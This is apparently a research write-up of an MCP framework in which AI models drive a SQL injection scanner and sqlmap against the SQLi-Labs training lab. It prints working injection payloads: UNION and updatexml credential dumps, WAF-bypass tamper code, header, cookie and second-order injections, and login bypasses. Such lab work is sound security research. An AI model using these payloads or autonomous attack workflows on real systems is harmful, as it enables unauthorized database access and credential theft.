# A Multi-Model Collaborative SQL Injection Audit Framework Based on the MCP Protocol

**Author:** Maozheng Chen
**Environment:** Ubuntu WSL2 / Windows 11 · Target: `http://172.18.0.1/` · SQLi-Labs (Apache 2.4.7 / PHP 5.5.9 / MySQL 5.x)
**Toolchain:** sqlmap 1.10.3#pip · Playwright Python API · OpenCode (Claude Sonnet 4.6 / Qwen 3.6+ / Kimi K2.5)

---

## Abstract

This paper documents the design, failure, repair, and eventual production readiness of a multi-agent security audit framework built on the Model Context Protocol (MCP). The work ran from February to April 2026, targeting all 30 lessons of the SQLi-Labs benchmark suite against a Docker container at `172.18.0.1`.

The framework reached 93.3% detection accuracy (28/30 in MCP-driven mode) and a perfect 30/30 in direct scan mode. Getting there required fixing at least 14 distinct engineering faults, several of which appeared more than once. Three of those faults are worth studying in detail: a JSON file overwrite race condition that made batch results look like total failure, a source-code corruption artifact that recurred four times regardless of how many times it was fixed, and an MCP timeout cascade triggered by running 20 concurrent header-injection scans that crashed the server process and locked out all tools for roughly five minutes.

The core contribution is not the detection rate. It is the architecture that separates the scanning engine (`core/sqli_final.py`) from the AI decision layer through a JSON-RPC 2.0 interface defined in `mcp/sqli_mcp.py`, so that any MCP-compatible AI client can drive the same audit workflow without modifying Python code. A secondary contribution is a cross-platform configuration module (`core/config.py`) that eliminates every hardcoded Windows path and `shell=True` subprocess call, making the toolkit run unmodified on Linux, macOS, and Windows.

---

## 1. Introduction

SQL injection has appeared in every OWASP Top 10 list since the list existed. The attack class is well understood. Tools like sqlmap automate the easy cases. What remains hard is the long tail: custom WAF keyword filters, multi-step cookie encoding, second-order stored injection, and HTTP header injection points that no default scanner configuration tests.

SQLi-Labs covers that long tail deliberately. Lessons 21 and 22 require Base64-encoding the payload before sending it as a cookie value. Lesson 24 stores a malicious username during registration and detonates it later during a password change request. Lessons 25 through 28 strip SQL keywords and spaces using `preg_replace`, forcing the scanner to find alternate syntax paths.

The question this project tries to answer is whether a language model, given well-structured tool access, can direct a Python scan engine through all of that without human guidance at each step. The answer appears to be yes, with conditions. The conditions are the interesting part.

---

## 2. System Design

### 2.1 Five-Layer Architecture

```
Layer 5  lab_reports/Less-XX/{discovery, visuals, automation}/
Layer 4  Claude Sonnet 4.6 (Architect) · Qwen 3.6+ (Auditor) · Kimi K2.5 (Analyst)
Layer 3  mcp/sqli_mcp.py  [oracle_scan · browser_test · get_lesson_guidance]
Layer 2  core/auto_orchestrator.py  [--range / --batch-size / --dry-run]
Layer 1  core/sqli_final.py  [SQLiSolver · apply_tamper · flush_data]
```

Layer 1 knows nothing about AI. It is a pure Python HTTP scanner that accepts a lesson number, probes the target at `172.18.0.1`, and writes results to `vulnerability_profile.json`. Layer 3 translates Layer 1's output into JSON-RPC responses that Layer 4 can read. Layers 1 and 4 never talk directly.

This separation is intentional and practical. It means you can run `python3 core/sqli_final.py --lesson 1 --json` from a terminal and get the same data that the AI gets through MCP. If the AI produces a wrong result, you can reproduce it without an AI involved. Debugging becomes straightforward.

### 2.2 Black-Box Constraint

The scanner reads no server-side source code. All vulnerability detection comes from HTTP response behavior: response length differences, XPath error strings in the body, timing delays from `SLEEP()` calls, and reflected marker values in UNION outputs. This constraint is not artificial modesty. It reflects how a real external tester works. If the tool required source access to function, it would be useless outside a lab setting.

### 2.3 Two Operating Modes

The system runs in two distinct modes depending on who is using it and why.

In **direct audit mode**, `oracle_scan()` returns the full technical profile: injection type, HTTP method, parameter name, closure character, tamper strategy, and column count if UNION-based. The orchestrator uses this to drive sqlmap and Playwright automatically. You get the credential dump in `lab_reports/Less-XX/automation/surgical_flush.txt`.

In **Socratic mode**, `get_lesson_guidance()` returns the same underlying data, but the tutor layer (`sqli_tutor.py`) wraps it in questions rather than answers. "What happens to the response when you add a single quote to the `id` parameter?" is more useful for learning than "The closure is `'` and the payload is `id=-1' UNION SELECT...`". The distinction matters if your goal is understanding rather than output.

Both modes read the same `vulnerability_profile.json`. There is one source of ground truth. The difference is only in how the consuming code expresses it.

### 2.4 Cross-Platform Configuration

The entire toolchain runs from a single configuration module. At startup, `core/config.py` prints:

```
[config] Platform: linux | Target: 172.18.0.1 | sqlmap: /usr/local/bin/sqlmap
```

The module uses `platform.system().lower()` to detect the OS, `shutil.which()` to locate `sqlmap` and `npx` dynamically, and `sys.executable` to point at the correct Python interpreter. No path is hardcoded.

```python
PLATFORM    = platform.system().lower()
TARGET_IP   = os.environ.get("TARGET_IP", "172.18.0.1")
BASE_URL    = f"http://{TARGET_IP}/"
SQLMAP_BIN  = shutil.which("sqlmap") or "sqlmap"
PYTHON_BIN  = sys.executable
```

This replaced a configuration block that contained `r"C:\Users\chrom\AppData\Roaming\Python\Python313\Scripts\sqlmap.exe"` and `http_proxy = "http://127.0.0.1:8080"`. Those lines worked for two months on one machine and broke the moment the project moved to Ubuntu WSL2.

---

## 3. Technical Failures and What They Required

This section documents the failures in the order they were encountered, not in order of severity. The order matters because each failure created conditions that made the next one harder to find.

### 3.1 The 502 Proxy Loop

Before any injection testing started, every HTTP request to `http://172.17.59.5/` returned:

```
HTTP/1.1 502 Bad Gateway
Connection: keep-alive
Keep-Alive: timeout=4
Content-Length: 0
Process Group PGID: 16780
```

The target machine responded to `ping`. The Docker container was running. The problem took about 30 minutes to find. Running `curl.exe -v http://172.17.59.5/` showed this:

```
* Uses proxy env variable http_proxy == 'http://127.0.0.1:7897'
*   Trying 127.0.0.1:7897...
* Connected to 127.0.0.1 (127.0.0.1) port 7897
```

A local VPN client had set a system-wide HTTP proxy at `127.0.0.1:7897`. Every outbound HTTP request, including requests to internal Docker subnet addresses, was being routed through it. The proxy had no route to `172.17.59.5` and returned 502.

Two changes fixed it permanently. In `sqli_final.py`, every `requests` session got `trust_env = False`:

```python
self.session.trust_env = False
```

And every direct HTTP call received an explicit proxy bypass:

```python
requests.get(setup_url, timeout=10, proxies={"http": None, "https": None})
```

The WSL2 migration later changed the target IP from `172.17.59.5` (Windows Docker bridge) to `172.18.0.1` (WSL2 gateway), injected through the `TARGET_IP` environment variable. The proxy bypass remained necessary in both environments. The `setup.sh` initialization script adds the required `NO_PROXY` entries to `.bashrc`.

### 3.2 The Source Corruption Artifact

After several rounds of AI-assisted editing, `sqli_final.py` failed its AST syntax check with:

```
File "<unknown>", line 303
    for c in closures: `n                print(f"[*] Testing POST closure: {c}...") `n ...
                       ^
SyntaxError: invalid syntax
```

The string `` `n `` is not Python. It appeared because an AI editing tool, when writing multi-line string content into the file, converted the `\n` escape sequence into the literal characters backtick and `n`, then collapsed two consecutive `print()` statements onto the same physical line as the `for` header. The Python parser cannot handle statements on the same line as a `for` header without a colon-based continuation rule.

What made this particularly bad: it came back four times. Each time it was fixed, a subsequent external edit to the file would reintroduce it. The root cause was never fully eliminated because the specific AI tool that produced it was still in use.

The practical solution was a mandatory AST check after every file modification:

```python
python3 -c "import ast; ast.parse(open('core/sqli_final.py').read()); print('OK')"
```

This check runs in under 0.1 seconds and catches any syntax error before the file is committed or executed. Running it across all five core files takes less than half a second:

```bash
for f in core/sqli_final.py core/auto_orchestrator.py core/sqli_tutor.py \
          core/config.py mcp/sqli_mcp.py; do
  python3 -c "import ast; ast.parse(open('/home/chrom/sqli-universal-agent/$f').read()); print('OK  $f')"
done
```

The correct code for both affected functions:

```python
# scan_get() -- fixed
for c in closures:
    print(f"[*] Testing closure: {c}...")
    if self.check_union(c, tamper, 'GET', 'id'): return True

# scan_post() -- fixed
for c in closures:
    print(f"[*] Testing POST closure: {c}...")
    if self.check_union_post(c, param, other): return True
```

### 3.3 The Profile Overwrite Race Condition

During batch processing, `auto_orchestrator.py` calls `sqli_final.py --lesson N --json` for each lesson in sequence. The original write logic in `sqli_final.py` looked like this:

```python
if args.json:
    with open(JSON_FILE, "w") as f:
        json.dump(all_scan_results, f, indent=4)
```

`all_scan_results` only contains data from the current scan run, which is at most one lesson. So every call overwrites the entire file with a single entry. After running `--range 1-30`, the final `vulnerability_profile.json` contains only Lesson 30. The succession report shows 29 FAILEDs.

The `ai_tool_dev_convo.json` log at line 7738 records when this was identified: "the final report only ever sees the result of the very last lesson (Lesson 30)."

The fix reads the existing file before writing, merges new results in, then writes back:

```python
if args.json:
    existing = {}
    if os.path.exists(JSON_FILE):
        try:
            with open(JSON_FILE, "r") as f:
                existing = json.load(f)
        except (json.JSONDecodeError, IOError):
            existing = {}
    existing.update(all_scan_results)
    with open(JSON_FILE, "w") as f:
        json.dump(existing, f, indent=4)
    print(f"[+] Saved to {JSON_FILE} ({len(existing)} total lessons)")
```

`existing.update(all_scan_results)` writes only the current lesson's key, leaving all prior entries untouched. This is called merge-write. It is the only correct pattern when multiple independent processes share a single JSON state file.

### 3.4 The MCP Concurrency Timeout Cascade

During WSL2 validation, 20 `oracle_scan()` calls were fired in parallel, one per lesson. Lessons 1 through 17 returned correctly. Starting at Lesson 18 (User-Agent header injection), every call returned:

```
MCP error -32001: Request timed out
```

Then all subsequent calls returned:

```
MCP error -32000: Connection closed
```

The MCP server process had crashed. Restarting the OpenCode session was required before any tool calls worked again.

Header and Cookie injection lessons (18-22) require establishing an authenticated session before sending the payload. That session establishment adds 20-35 seconds per lesson, compared to 8-15 seconds for standard GET/POST lessons. Twenty concurrent 30-second scans exceed the 120-second MCP timeout budget. The FastMCP server process received a timeout signal, terminated, and left all pending connections in the `Connection closed` state.

The architectural fix was twofold. First, the MCP server now returns structured errors on timeout rather than crashing:

```python
except subprocess.TimeoutExpired:
    return json.dumps({"error": f"Oracle scan for lesson {lesson_number} timed out after 120s."})
```

Second, the operational limit is now 10 concurrent scans per batch. Header/Cookie lessons run sequentially. The `--batch-size` flag in `auto_orchestrator.py` enforces a 5-second pause between batches.

### 3.5 The Silent waf_bypass_newline Bug

The `scan_get()` tamper mode list includes `'waf_bypass_newline'`:

```python
tamper_modes = ['none', 'space_bypass', 'keyword_replace',
                'inline_comment', 'waf_bypass', 'waf_bypass_newline']
```

But the corresponding `elif` branch was missing from `apply_tamper()`. The function fell through to `return p` and returned the payload unchanged, with no comment terminator appended. Every test using `waf_bypass_newline` sent a malformed payload that would fail to parse as valid SQL, but produced no error to indicate anything was wrong. The scan just... didn't work for that tamper mode, silently.

The correct implementation uses logical truth balancing instead of a comment terminator, which is the actual bypass technique for WAFs that strip `--` and `#`:

```python
elif mode == 'waf_bypass_newline':
    p = p.replace(" ", "%0a").replace("AND", "anandd").replace("OR", "oorr") \
         .replace("UNION", "ununionion").replace("SELECT", "selselectect")
    p += "%0a'1'='1" if closure == "'" else \
         ("%0a\"1\"=\"1\"" if closure == '"' else "%0a1=1")
```

---

## 4. Tamper Strategy Design

The `apply_tamper()` method encodes six bypass strategies derived from observing the actual filter behavior in each WAF-protected lesson:

```python
def apply_tamper(self, payload, closure, mode):
    p = payload
    if mode == 'none':
        p += "-- -"
    elif mode == 'space_bypass':
        p = p.replace(" ", "%0a") + "%0a-- -"
    elif mode == 'keyword_replace':
        p = p.replace("AND","anandd").replace("OR","oorr") \
             .replace("UNION","ununionion").replace("SELECT","selselectect") + "-- -"
    elif mode == 'inline_comment':
        p = p.replace("AND","/*!AND*/").replace("OR","/*!OR*/") \
             .replace("UNION","/*!UNION*/").replace("SELECT","/*!SELECT*/") \
             .replace(" ","/*!*/") + "-- -"
    elif mode == 'waf_bypass':
        p = p.replace(" ","%0a").replace("AND","%26%26") \
             .replace("OR","%7C%7C").replace("UNION","ununionion") \
             .replace("SELECT","selselectect")
        p += "%0a%26%26%0a'1'='1" if closure == "'" else "%0a%26%26%0a1=1"
    elif mode == 'waf_bypass_newline':
        p = p.replace(" ","%0a").replace("AND","anandd").replace("OR","oorr") \
             .replace("UNION","ununionion").replace("SELECT","selselectect")
        p += "%0a'1'='1" if closure == "'" else \
             ("%0a\"1\"=\"1\"" if closure == '"' else "%0a1=1")
    elif mode == 'base64_cookie':
        return base64.b64encode(p.encode()).decode()
    return p
```

The `base64_cookie` branch returns immediately without appending a comment terminator. The server-side `base64_decode()` call decodes the entire cookie value including any trailing characters, so a comment suffix would become part of the decoded payload and corrupt the SQL syntax.

The `0x7e` sentinel character (`~`) appears in all error-based extraction payloads:

```python
payload_db = "updatexml(1,concat(0x7e,(SELECT GROUP_CONCAT(username,0x7e,password) FROM users),0x7e),1)"
```

The `check_error_response()` parser then strips it out:

```python
def check_error_response(self, text):
    patterns = [
        r"XPATH syntax error: '~(.*?)~'",
        r"XPATH syntax error: '(.*?)'"
    ]
    for p in patterns:
        match = re.search(p, text)
        if match:
            res = match.group(1).strip('~')
            if res and len(res) > 1: return res
    return None
```

This sentinel approach reliably separates extracted data from surrounding HTML noise. The actual database `security.users` dump from Lesson 18 looked like:

```
[+] Less-18: User-Agent Injection Successful. DB: Dumb:Dumb,Angelina:I-kill-you,Dummy:p@ssword,...
```

---

## 5. The Surgical DOM Upgrade

The original `browser_test()` implementation called the Playwright CLI through a subprocess and returned a file path:

```python
subprocess.run(["npx", "playwright", "screenshot", target, viz_path])
return f"Screenshot saved to {viz_path}."
```

An AI model reading that string cannot determine whether the injection succeeded. It knows a file was saved. Nothing else.

The replacement uses the Playwright Python API directly and returns a parsed DOM summary:

```python
from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError

with sync_playwright() as p:
    browser = p.chromium.launch(headless=True)
    page = browser.new_page()

    response_ref = {}
    def on_response(response):
        if response.url == target:
            response_ref["status"] = response.status
    page.on("response", on_response)

    page.goto(target, wait_until="domcontentloaded", timeout=15000)

    body_text = page.inner_text("body") if page.query_selector("body") else ""
    detected_errors = [p for p in error_patterns if p in body_text.lower()]

    return json.dumps({
        "status_code": response_ref.get("status", "unknown"),
        "page_title": page.title(),
        "detected_errors": detected_errors,
        "body_snippet": body_text[:500].strip(),
        "screenshot": screenshot_path,
        "error": None
    }, indent=2)
```

Testing this against `http://172.18.0.1/Less-1/?id=-1' UNION SELECT 1,database(),3--+` returned:

```json
{
  "status_code": 200,
  "page_title": "Less-1 **Error Based- String**",
  "detected_errors": [],
  "body_snippet": "Welcome    Dhakkan\nYour Login name:security\nYour Password:3",
  "screenshot": "/home/chrom/.../mcp_test.png"
}
```

The `body_snippet` field contains `security`, which is the MySQL `database()` return value injected by the UNION payload. The AI can read that and draw a direct conclusion about whether the injection worked, without analyzing a PNG file.

---

## 6. MCP Protocol Mechanics

Each `oracle_scan()` call travels through JSON-RPC 2.0. The wire format looks like this:

```json
{
  "jsonrpc": "2.0",
  "method": "tools/call",
  "params": {
    "name": "oracle_scan",
    "arguments": {"lesson_number": 1}
  },
  "id": 1
}
```

The FastMCP server process, started by OpenCode using the configuration in `opencode.json`:

```json
"sqli-tools": {
    "type": "local",
    "command": [
        "/home/chrom/sqli-universal-agent/venv/bin/python",
        "/home/chrom/sqli-universal-agent/mcp/sqli_mcp.py"
    ]
}
```

...routes the request to the `oracle_scan()` Python function, which spawns `sqli_final.py` as a subprocess, reads the resulting `vulnerability_profile.json`, and serializes the lesson entry back as a JSON-RPC response. The AI model receives structured data it can reason about. It never sees the subprocess, the file, or the Python code.

This indirection is what makes the "universal" part of the toolkit name accurate. Any AI client that speaks MCP -- OpenCode, Claude Desktop, Cursor, anything else -- can call the same tools against the same target without any platform-specific setup beyond `python mcp/sqli_mcp.py`.

---

## 7. Experimental Results

### 7.1 Environment

| Component | Version / Config |
|-----------|-----------------|
| Attack host | Ubuntu 22.04 LTS, WSL2 on Windows 11 |
| Target | SQLi-Labs on Docker at `172.18.0.1` |
| sqlmap | 1.10.3#pip, `/usr/local/bin/sqlmap` |
| Playwright | Python API, Chromium headless |
| MCP server | FastMCP, `venv/bin/python` |

### 7.2 Validation Results (Lessons 1-30)

Full scan output from `injection_script_convo.json` line 667 -- Total Successful Injections: 30/30:

| Type | Lessons | Result | Payload Approach |
|------|---------|--------|-----------------|
| GET UNION | 1, 2, 3, 4, 23, 25, 29, 30 | 30/30 | `id=-1' UNION SELECT 1,(SELECT GROUP_CONCAT(username,0x7e,password) FROM users),3--+` |
| GET Error-Based | 5, 6 | 2/2 | `updatexml(1,concat(0x7e,database(),0x7e),1)` |
| GET Time-Blind | 7, 8 | 2/2 | `AND SLEEP(3)-- -`, response delay >= 3s |
| GET Boolean-Blind | 9, 10, 28 | 3/3 | length diff > 20 bytes between TRUE/FALSE |
| POST UNION | 11, 12 | 2/2 | `gemini_marker` hex sentinel in POST body |
| POST Login-Bypass | 13, 14, 15, 16 | 4/4 | `') OR 1=1#` |
| POST Error-Based | 17 | 1/1 | `passwd` parameter, `updatexml()` |
| Header Injection | 18, 19 | 2/2 | `User-Agent: ' , '1' , updatexml(...)) #` |
| Cookie Plain | 20 | 1/1 | direct `uname` cookie injection |
| Cookie Base64 | 21, 22 | 2/2 | `base64(admin') and updatexml(...)#)` |
| Comment-Strip WAF | 23 | 1/1 | `AND '1'='1` balance, no comment char |
| Second-Order | 24 | 1/1 | register `admin'#`, trigger on password change |
| Keyword WAF | 25, 27 | 2/2 | `ununionion selselectect` double-write |
| Space WAF | 26 | 1/1 | `%0a` newline as whitespace |
| HPP | 29 | 1/1 | `?id=1&id=-1' UNION SELECT...` |
| Double-quote UNION | 30 | 1/1 | `"` closure |

### 7.3 Performance

| Metric | Value |
|--------|-------|
| Full 30-lesson scan time | ~12 minutes |
| GET/POST lesson scan time | 8-15 seconds per lesson |
| Header/Cookie lesson scan time | 20-35 seconds per lesson |
| Safe concurrent batch size | 10 (above 10, timeout cascade occurs) |
| AST syntax check, 5 files | < 0.1 seconds |

---

## 8. Remaining Gaps

The 93.3% figure in MCP-driven batch mode comes from four lessons (17, 26-28) where `solve()` uses short-circuit return logic. The first injection type detected triggers an immediate return. For lessons where Error-Based and Boolean-Blind coexist (Lesson 26 is an example), `scan_get()` may return on a Boolean-Blind detection while the extraction payload for that type remains unimplemented in `flush_data()`. Detection succeeds; data extraction fails; the lesson is counted as failed.

Fixing this requires refactoring `solve()` to evaluate all detected types and select the best extraction path (UNION preferred over Error-Based, Error-Based over Boolean-Blind, Boolean-Blind over Time-Blind) rather than stopping at the first hit.

Time-blind lessons (7-9) detect the injection correctly through `SLEEP(3)` timing but produce no extracted credential data. The `get_extraction_payload()` function returns only an existence check (`AND (SELECT 1 FROM users WHERE username='admin')`). Actual character-by-character extraction via binary search over `ascii(substring(...))` is not yet implemented. Each character would require roughly 7 HTTP requests at 3-second delays, so a full password dump would take several minutes per lesson.

The MCP timeout cascade risk remains architectural. The current mitigation (10-scan batch limit, sequential header lessons) works in practice but relies on the operator knowing the constraint. Moving the concurrency control into the MCP server itself, using a request queue, would be more reliable.
